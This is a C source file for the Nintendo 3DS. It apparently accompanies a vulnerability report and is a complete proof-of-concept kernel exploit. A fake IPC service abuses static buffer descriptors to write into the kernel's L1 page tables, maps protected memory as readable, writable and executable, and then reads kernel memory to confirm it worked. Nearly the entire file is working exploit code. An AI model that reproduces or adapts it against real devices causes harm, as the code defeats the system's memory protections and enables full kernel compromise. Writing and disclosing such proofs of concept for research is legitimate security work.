#include <3ds.h>
#include <stdio.h>
#include <stdlib.h>

#define KERNVA2PA(a)  ((a) + (*(vu32 *)0x1FF80060 < SYSTEM_VERSION(2, 44, 6) ? 0xD0000000 : 0xC0000000))
#define MAPADDR       0x80000000


static u32 serverThreadStack[0x1000/4] = {0};

static void server(void *p)
{
    (void)p;
    u32 *cmdbuf = getThreadCommandBuffer();
    u32 *staticbufs = getThreadStaticBuffers();
    s32 idx = -1;

    Handle serverPort = 0, serverSession = 0;

    /* Boilerplate to get a service session going... */
    srvRegisterService(&serverPort, "banana", 1);
    cmdbuf[0] = 0xFFFF0000;

    svcReplyAndReceive(&idx, &serverPort, 1, 0);
    svcAcceptSession(&serverSession, serverPort);

    /* We got a session, time to do the exploit as described in the report... */

    staticbufs[0] = IPC_Desc_StaticBuffer(0, 0); /* size = 0, to avoid crashes... */
    staticbufs[1] = KERNVA2PA(0x1FFF8000) + (MAPADDR >> 20) * 4; /* Core0 L1 table entry */

    staticbufs[2] = IPC_Desc_StaticBuffer(0, 1); /* size = 0 */
    staticbufs[3] = KERNVA2PA(0x1FFFC000) + (MAPADDR >> 20) * 4; /* Core1 L1 table entry */

    cmdbuf[0] = 0xFFFF0000;

    /* The arbitrary write happens HERE */
    svcReplyAndReceive(&idx, &serverSession, 1, 0);

    /* Send a proper reply */
    cmdbuf[0] = IPC_MakeHeader(0, 1, 0);
    cmdbuf[1] = 0xCAFECAFE;

    svcCloseHandle(serverSession);
    svcCloseHandle(serverPort);
    srvUnregisterService("banana");
    svcExitThread();
}

static void exploit(void)
{
    /* Create the server thread. In a real-world exploitation scenario, this would be an already-existing service */
    Handle serverThread = 0;
    svcCreateThread(&serverThread, server, 0, serverThreadStack, 0x18, -2);

    Handle clientSession = 0;
    srvGetServiceHandle(&clientSession, "banana");

    /* Prepare the L2 table: map the full AXIWRAM as "Strongly Ordered", RWXRWX */
    static u32 ALIGN(0x1000) l2table[0x100] = {0};
    for(u32 offset = 0; offset < 0x80000; offset += 0x1000) {
        l2table[offset >> 12] = (0x1FF80000 + offset) | 0x432;
    }

    u32 *cmdbuf = getThreadCommandBuffer();

    /* The exploit happens HERE for the client side */
    cmdbuf[0] = IPC_MakeHeader(1, 1, 4);
    cmdbuf[1] = 0;
    cmdbuf[2] = IPC_Desc_PXIBuffer(0x400, 0, false);
    cmdbuf[3] = (u32)l2table | 1;
    cmdbuf[4] = IPC_Desc_PXIBuffer(0x400, 1, false);
    cmdbuf[5] = (u32)l2table | 1;
    svcSendSyncRequest(clientSession);

    svcCloseHandle(clientSession);
    svcCloseHandle(serverThread);
}

static inline void *fixAddr(uintptr_t addr)
{
    return (void *)(addr - 0x1FF80000 + 0x80000000);
}

static void testExploit(void)
{
    printf("Data at 0x1FFF4000 (PA corresponding to 0xFFFF0000): %08lX\n", *(vu32 *)fixAddr(0x1FFF4000));
}

int main(void)
{
    /* Boilerplate */
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    printf("Hello, world!\n");
    printf("Doing exploit...\n");

    exploit();
    testExploit();

    /* Boilerplate */
    while (aptMainLoop()) {
        gspWaitForVBlank();
        gfxSwapBuffers();
        hidScanInput();

        u32 kDown = hidKeysDown();
        if (kDown & KEY_START)
            break;
    }

    gfxExit();
    return 0;
}
